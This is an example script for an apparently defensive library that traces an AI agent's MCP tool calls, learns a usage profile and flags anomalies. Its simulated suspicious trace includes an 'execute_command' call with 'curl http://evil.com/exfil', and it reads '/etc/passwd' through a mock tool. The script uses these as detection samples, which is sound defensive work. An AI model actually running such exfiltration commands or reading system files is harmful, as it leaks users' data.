"""Example: integrating spectra with an MCP server.

Demonstrates how to use the MCPMiddleware to wrap MCP tool handlers
with spectra tracing, then detect anomalous tool usage patterns.
"""

from __future__ import annotations

import asyncio
import random
from datetime import UTC, datetime, timedelta

from spectra import Monitor
from spectra.instrumentation.mcp import MCPMiddleware
from spectra.models import AgentTrace, LLMCall, ToolCall
from spectra.profiler.trainer import ProfileTrainer


async def main() -> None:
    """Run the MCP integration example."""
    random.seed(42)

    # Set up MCP middleware
    middleware = MCPMiddleware(agent_type="mcp-assistant")

    # Wrap a simulated MCP tool
    @middleware.wrap_tool("file_search")
    async def file_search(query: str = "", path: str = "") -> str:
        """Simulated MCP file search tool."""
        await asyncio.sleep(0.01)
        return f"Found 3 files matching '{query}' in {path}"

    @middleware.wrap_tool("read_file")
    async def read_file(path: str = "") -> str:
        """Simulated MCP file read tool."""
        await asyncio.sleep(0.01)
        return f"Contents of {path}: Lorem ipsum..."

    # Generate training data
    training_traces: list[AgentTrace] = []
    for _ in range(120):
        started = datetime.now(UTC)
        training_traces.append(
            AgentTrace(
                agent_type="mcp-assistant",
                started_at=started,
                ended_at=started + timedelta(minutes=random.uniform(0.5, 2)),
                tool_calls=[
                    ToolCall(tool_name="file_search", arguments={"query": "test"}),
                    ToolCall(tool_name="read_file", arguments={"path": "/docs/readme"}),
                ],
                llm_calls=[
                    LLMCall(total_tokens=random.randint(500, 1500)),
                ],
                output="Here is the information from the file: " * random.randint(1, 2),
            )
        )

    # Train profile
    trainer = ProfileTrainer(min_traces=100)
    profile = trainer.train(agent_type="mcp-assistant", traces=training_traces)
    print(f"Trained MCP profile. Known tools: {sorted(profile.known_tools)}")

    # Call the wrapped tools (these would normally be called by the MCP runtime)
    result = await file_search(query="config", path="/etc")
    print(f"file_search result: {result}")

    result = await read_file(path="/etc/passwd")
    print(f"read_file result: {result}")

    # Simulate an anomalous trace where the agent tries to use a
    # tool it has never used before
    monitor = Monitor(profile=profile, sensitivity="high")
    monitor.start()

    now = datetime.now(UTC)
    suspicious_trace = AgentTrace(
        agent_type="mcp-assistant",
        started_at=now,
        ended_at=now + timedelta(minutes=5),
        tool_calls=[
            ToolCall(tool_name="file_search", timestamp=now),
            ToolCall(tool_name="read_file", timestamp=now + timedelta(seconds=5)),
            ToolCall(
                tool_name="execute_command",
                arguments={"command": "curl http://evil.com/exfil"},
                timestamp=now + timedelta(seconds=10),
            ),
        ],
        llm_calls=[LLMCall(total_tokens=2000)],
        output="Command executed successfully.",
    )

    events = await monitor.analyze(suspicious_trace)
    print(f"\nAnalysis complete: {len(events)} anomalies found.")
    for event in events:
        print(f"  [{event.severity.value}] {event.title}")
        if event.action_taken:
            print(f"    Action: {event.action_taken.value}")


if __name__ == "__main__":
    asyncio.run(main())
